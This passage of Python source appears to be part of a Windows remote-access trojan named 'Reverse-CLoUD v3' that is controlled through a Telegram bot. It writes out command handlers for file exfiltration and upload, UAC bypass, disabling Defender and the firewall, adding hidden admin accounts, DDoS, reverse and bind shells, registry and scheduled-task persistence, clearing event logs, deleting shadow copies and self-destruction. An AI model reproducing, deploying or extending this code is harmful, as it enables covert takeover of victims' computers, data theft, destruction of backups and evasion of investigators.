            return "❌ /unhidefile <path>"
        try:
            os.system(f'attrib -h -s "{args}" 2>nul')
            return f"✅ Unhidden: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_tree(self, args, msg):
        self.cmd_count += 1
        path = args if args else "."
        try:
            result = subprocess.check_output(f'tree "{path}" /F 2>nul', shell=True, text=True)
            return f"🔹 Tree\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_bootmanager(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("bcdedit /enum 2>nul", shell=True, text=True)
            return f"🔹 Boot Manager\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_drivermanager(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("driverquery /v 2>nul", shell=True, text=True)
            return f"🔹 Drivers\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_powerscheme(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /powerscheme <high|balanced|powersaver>"
        try:
            if args.lower() == "high":
                os.system('powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>nul')
            elif args.lower() == "balanced":
                os.system('powercfg -setactive 381b4222-f694-41f0-9685-ff5bb260df2e 2>nul')
            elif args.lower() == "powersaver":
                os.system('powercfg -setactive a1841308-3541-4fab-bc81-f71556f20b4a 2>nul')
            else:
                return "❌ Invalid scheme"
            return f"✅ Power scheme: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_volume(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /volume <mute|unmute|up|down>"
        try:
            if args.lower() == "mute":
                ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
                return "🔇 Muted"
            elif args.lower() == "unmute":
                ctypes.windll.user32.keybd_event(0xAD, 0, 2, 0)
                return "🔊 Unmuted"
            elif args.lower() == "up":
                for _ in range(5):
                    ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                    ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
                return "🔊 Volume up"
            elif args.lower() == "down":
                for _ in range(5):
                    ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                    ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
                return "🔉 Volume down"
            return "❌ Invalid"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_brightness(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /brightness <0-100>"
        try:
            os.system(f'powershell (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(0,{args}) 2>nul')
            return f"✅ Brightness: {args}%"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_screenrotate(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /screenrotate <0|90|180|270>"
        try:
            os.system(f'powershell (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBasicDisplayParams).Rotation = {args} 2>nul')
            return f"✅ Rotated: {args}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_taskbarhide(self, args, msg):
        self.cmd_count += 1
        try:
            os.system('powershell (New-Object -ComObject Shell.Application).ToggleDesktop() 2>nul')
            return "✅ Taskbar hidden"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_desktopicons(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /desktopicons <show|hide>"
        try:
            if args.lower() == "show":
                os.system('powershell (New-Object -ComObject Shell.Application).ShowDesktop() 2>nul')
                return "✅ Icons shown"
            elif args.lower() == "hide":
                os.system('powershell (New-Object -ComObject Shell.Application).HideDesktop() 2>nul')
                return "✅ Icons hidden"
            return "❌ Invalid"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_systeminfogui(self, args, msg):
        try:
            os.system("start msinfo32")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_networkgui(self, args, msg):
        try:
            os.system("start ncpa.cpl")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_processgui(self, args, msg):
        try:
            os.system("start taskmgr")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_filegui(self, args, msg):
        try:
            os.system("start explorer")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_cmdgui(self, args, msg):
        try:
            os.system("start cmd")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_reggui(self, args, msg):
        try:
            os.system("start regedit")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_eventgui(self, args, msg):
        try:
            os.system("start eventvwr")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    def cmd_servicegui(self, args, msg):
        try:
            os.system("start services.msc")
            return "✅ Opened"
        except Exception:
            return "❌ Failed"

    
    def cmd_upload(self, args, msg):
        """
        Simple upload: just type /upload then send any file.
        File will be saved to current directory (PS CWD).
        """
        self.cmd_count += 1

        
        default_dir = os.getcwd()
        try:
            result = self.ps_shell.execute("pwd", timeout=5)
            if isinstance(result, tuple):
                _, cwd = result
                if cwd and os.path.isdir(cwd):
                    default_dir = cwd
        except Exception:
            pass

        
        if args:
            save_path = args.strip().strip('"')
        else:
            save_path = default_dir

        if os.path.isdir(save_path):
            self.pending_upload = save_path
            bot.send_message(
                f"📥 Ready to receive file\n"
                f"📁 Save to: `{save_path}`\n"
                f"💡 Just send the file now!\n"
                f"⏱️ 5 min timeout"
            )
        else:
            self.pending_upload = save_path
            bot.send_message(
                f"📥 Ready to receive file\n"
                f"📁 Save as: `{save_path}`\n"
                f"💡 Just send the file now!\n"
                f"⏱️ 5 min timeout"
            )

        def clear_pending():
            time.sleep(300)
            if self.pending_upload:
                self.pending_upload = None
                bot.send_message("⏱️ Upload timeout")

        threading.Thread(target=clear_pending, daemon=True).start()
        return None

    def cmd_download(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /download <file_path>"
        return self.fileops.download(args.strip().strip('"'))

    def cmd_downloadurl(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /downloadurl <url> <save_path>"
        return self.fileops.download_url(parts[0], parts[1])

    def cmd_delete(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /delete <path>"
        return self.fileops.delete(args.strip().strip('"'))

    def cmd_find(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /find <filename>"
        return self.fileops.find(args)

    def cmd_ls(self, args, msg):
        self.cmd_count += 1
        path = args if args else "."
        return self.fileops.list_dir(path)

    def cmd_copy(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /copy <src> <dst>"
        return self.fileops.copy(parts[0], parts[1])

    def cmd_move(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /move <src> <dst>"
        return self.fileops.move(parts[0], parts[1])

    def cmd_rename(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /rename <old_path> <new_name>"
        return self.fileops.rename(parts[0], parts[1])

    def cmd_mkdir(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /mkdir <path>"
        return self.fileops.mkdir(args)

    def cmd_zip(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /zip <folder> <output.zip>"
        return self.fileops.zip(parts[0], parts[1])

    def cmd_unzip(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /unzip <file.zip> <extract_to>"
        return self.fileops.unzip(parts[0], parts[1])

    def cmd_fileproperties(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /fileproperties <path>"
        try:
            stats = os.stat(args)
            return f"""
🔹 File Properties
- Path: {args}
- Size: {stats.st_size} bytes
- Created: {datetime.fromtimestamp(stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}
- Modified: {datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_filehash(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /filehash <path>"
        try:
            with open(args, "rb") as f:
                data = f.read()
            return f"""
🔹 File Hash
- MD5: {hashlib.md5(data).hexdigest()}
- SHA1: {hashlib.sha1(data).hexdigest()}
- SHA256: {hashlib.sha256(data).hexdigest()}
"""
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_uac(self, args, msg):
        self.cmd_count += 1
        return self.privesc.uac_bypass()

    def cmd_uacadvanced(self, args, msg):
        self.cmd_count += 1
        return self.privesc.uac_bypass_advanced()

    def cmd_system(self, args, msg):
        self.cmd_count += 1
        return self.privesc.system_access()

    def cmd_disabledefender(self, args, msg):
        self.cmd_count += 1
        return self.privesc.disable_defender()

    def cmd_disablefirewall(self, args, msg):
        self.cmd_count += 1
        return self.privesc.disable_firewall()

    def cmd_addadmin(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /addadmin <username>"
        return self.privesc.add_admin(args.strip().strip('"'))

    def cmd_hiddenuser(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /hiddenuser <username> <password>"
        return self.privesc.hidden_user(parts[0], parts[1])

   
    def cmd_scanports(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if not parts:
            return "❌ /scanports <ip> [range]"
        target = parts[0]
        port_range = parts[1] if len(parts) > 1 else "1-1000"
        return self.network.scan_ports(target, port_range)

    def cmd_scannetwork(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("arp -a 2>nul", shell=True, text=True)
            return f"🔹 Network Scan\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_ddos(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 3:
            return "❌ /ddos <ip> <port> <duration>"
        return self.network.ddos(parts[0], parts[1], parts[2])

    def cmd_checkinternet(self, args, msg):
        self.cmd_count += 1
        try:
            hosts = ["8.8.8.8", "1.1.1.1", "4.2.2.4"]
            for host in hosts:
                try:
                    socket.gethostbyname(host)
                    return f"✅ Internet OK (DNS: {host})"
                except Exception:
                    continue
            return "❌ No internet"
        except Exception:
            return "❌ Check failed"

    def cmd_wifiscan(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("netsh wlan show networks 2>nul", shell=True, text=True)
            return f"🔹 WiFi\n```\n{result[:4000]}\n```"
        except Exception:
            return "❌ Failed"

    def cmd_dnschange(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 1:
            return "❌ /dnschange <primary> [secondary]"
        primary = parts[0]
        secondary = parts[1] if len(parts) > 1 else ""
        try:
            os.system(f'netsh interface ip set dns "Ethernet" static {primary} 2>nul')
            if secondary:
                os.system(f'netsh interface ip add dns "Ethernet" {secondary} index=2 2>nul')
            return f"✅ DNS: {primary}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_proxy(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /proxy <ip> <port>"
        try:
            os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f 2>nul')
            os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer /t REG_SZ /d "{parts[0]}:{parts[1]}" /f 2>nul')
            return f"✅ Proxy: {parts[0]}:{parts[1]}"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_reverseshell(self, args, msg):
        self.cmd_count += 1
        parts = args.split()
        if len(parts) < 2:
            return "❌ /reverseshell <ip> <port>"
        return self.network.reverse_shell(parts[0], parts[1])

    def cmd_bindshell(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /bindshell <port>"
        return self.network.bind_shell(args)

    def cmd_netstat(self, args, msg):
        self.cmd_count += 1
        try:
            result = subprocess.check_output("netstat -ano 2>nul", shell=True, text=True)
            return f"🔹 Netstat\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_ping(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /ping <host>"
        try:
            result = subprocess.check_output(f'ping -n 4 {args} 2>nul', shell=True, text=True, timeout=10)
            return f"🔹 Ping\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_whois(self, args, msg):
        self.cmd_count += 1
        if not args:
            return "❌ /whois <domain>"
        try:
            result = subprocess.check_output(f'whois {args} 2>nul', shell=True, text=True, timeout=10)
            return f"🔹 WHOIS\n```\n{result[:4000]}\n```"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_persist(self, args, msg):
        self.cmd_count += 1
        if self.guard.install_all():
            return "✅ Persistence installed (30 SAFE methods)"
        return "❌ Persistence failed"

    def cmd_persistcheck(self, args, msg):
        self.cmd_count += 1
        try:
            checks = []
            checks.append(f"🛡️ Python: UNTOUCHED ({sys.executable})")
            checks.append(f"📁 Safe Dir: {SAFE_DIR}")
            checks.append(f"📄 Safe EXE: {'✅' if os.path.exists(SAFE_EXE) else '❌'}")

            reg = subprocess.run(f'reg query HKCU\\{REG_KEY} /v {REG_VAL}', shell=True, capture_output=True, text=True)
            checks.append(f"Registry: {'✅' if reg.returncode == 0 else '❌'}")

            task = subprocess.run(f'schtasks /query /tn "{TASK_NAME}"', shell=True, capture_output=True, text=True)
            checks.append(f"Task: {'✅' if task.returncode == 0 else '❌'}")

            startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            startup_file = os.path.join(startup, f"{REG_VAL}.exe")
            checks.append(f"Startup: {'✅' if os.path.exists(startup_file) else '❌'}")

            return "🔹 Persistence Status\n" + "\n".join(checks)
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_unpersist(self, args, msg):
        self.cmd_count += 1
        if self.guard.remove_all():
            return "✅ Persistence removed (Python UNTOUCHED)"
        return "❌ Failed"

    def cmd_wipetraces(self, args, msg):
        self.cmd_count += 1
        try:
            os.system('wevtutil cl System 2>nul')
            os.system('wevtutil cl Security 2>nul')
            os.system('wevtutil cl Application 2>nul')
            os.system('del /f /q C:\\Windows\\Prefetch\\*.pf 2>nul')
            return "✅ Traces wiped"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    
    def cmd_clearlogs(self, args, msg):
        self.cmd_count += 1
        try:
            os.system('wevtutil cl System 2>nul && wevtutil cl Security 2>nul && wevtutil cl Application 2>nul')
            return "✅ Logs cleared"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_deleteshadows(self, args, msg):
        self.cmd_count += 1
        try:
            os.system('vssadmin delete shadows /all /quiet 2>nul')
            return "✅ Shadows deleted"
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def cmd_suicide(self, args, msg):
        self.cmd_count += 1
        try:
            bot.send_message("☠️ Self-destruct\n🛡️ Python will remain SAFE")

            os.system(f'reg delete HKCU\\{REG_KEY} /v {REG_VAL} /f 2>nul')
            os.system(f'schtasks /delete /tn "{TASK_NAME}" /f 2>nul')

            try:
                shutil.rmtree(SAFE_DIR)
            except Exception:
                pass

            try:
                os.remove(os.path.join(tempfile.gettempdir(), f"{REG_VAL}_tmp.exe"))
            except Exception:
                pass

            try:
                self.ps_shell.close()
            except Exception:
                pass

            try:
                self.cmd_shell.close()
            except Exception:
                pass

            if "python" not in sys.executable.lower():
                try:
                    os.remove(sys.executable)
                except Exception:
                    pass
            else:
                bot.send_message("⚠️ Python mode - skipping self-delete")

            bot.send_message("☠️ Complete!\n🛡️ Python UNTOUCHED")
            self.running = False
            os._exit(0)
        except Exception:
            os._exit(1)

   

    def handle_document(self, msg):
        if not self.pending_upload:
            bot.send_message("❌ No pending upload.\nUse `/upload` first (then send file).")
            return

        try:
            file_id = msg["document"]["file_id"]
            file_name = msg["document"].get("file_name", "uploaded_file.bin")
            file_size = msg["document"].get("file_size", 0)

            bot.send_message(f"📥 Receiving...\n📄 {file_name}\n📊 {round(file_size/1024, 2)} KB")

            file_data = bot.get_file_data(file_id)
            if file_data is None:
                bot.send_message("❌ Download failed")
                self.pending_upload = None
                return

            save_path = self.pending_upload
            if os.path.isdir(save_path):
                final_path = os.path.join(save_path, file_name)
            else:
                final_path = save_path
                try:
                    os.makedirs(os.path.dirname(final_path), exist_ok=True)
                except Exception:
                    pass

            try:
                with open(final_path, "wb") as f:
                    f.write(file_data)
                file_size_actual = os.path.getsize(final_path)
                bot.send_message(f"✅ Uploaded!\n📁 {final_path}\n📊 {round(file_size_actual/1024, 2)} KB")
            except PermissionError:
                fallback = os.path.join(tempfile.gettempdir(), file_name)
                with open(fallback, "wb") as f:
                    f.write(file_data)
                bot.send_message(f"⚠️ Permission denied. Saved to: {fallback}")

            self.pending_upload = None

        except Exception as e:
            bot.send_message(f"❌ Upload failed: {str(e)}")
            self.pending_upload = None

   

    def run(self):
        try:
            bot.send_message(
                "💀 Reverse-CLoUD v3\n"
                "🛡️ Python-Safe\n"
                "💥 Persistent PowerShell + CMD\n"
                "Type /help\n"
                "Author: Lxx CLoUD - @lxxcloud"
            )

            while self.running:
                try:
                    updates = bot.get_updates()
                    for update in updates:
                        msg = update.get("message")
                        if not msg:
                            continue
                        if str(msg.get("chat", {}).get("id", "")) != ADMIN_ID:
                            continue

                        if "document" in msg:
                            self.handle_document(msg)
                            continue

                        text = msg.get("text", "").strip()
                        if not text:
                            continue

                        parts = text.split(maxsplit=1)
                        cmd = parts[0].lower().replace("/", "")
                        args = parts[1] if len(parts) > 1 else ""

                        if cmd in self.commands:
                            self.cmd_count += 1
                            response = self.commands[cmd](args, msg)
                            if response:
                                bot.send_message(response)
                        else:
                            bot.send_message(f"❌ Unknown: /{cmd}")
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    self.running = False
                    break
                except PermissionError as e:
                    CONSOLE.warn("Permission error in loop", str(e))
                    time.sleep(2)
                except Exception as e:
                    CONSOLE.fail("Loop error", str(e))
                    time.sleep(2)
        except Exception as e:
            CONSOLE.fail("Fatal error", str(e))



if __name__ == "__main__":
    try:
        global requests
        try:
            import requests
        except ImportError:
            subprocess.run("python -m pip install requests -q", shell=True)
            import requests

        core = PhantomCore()

        import atexit
        atexit.register(lambda: core.ps_shell.close() if hasattr(core, 'ps_shell') else None)
        atexit.register(lambda: core.cmd_shell.close() if hasattr(core, 'cmd_shell') else None)

        core.run()
    except Exception as e:
        CONSOLE.fail("Fatal error", str(e))
        traceback.print_exc()
        time.sleep(5)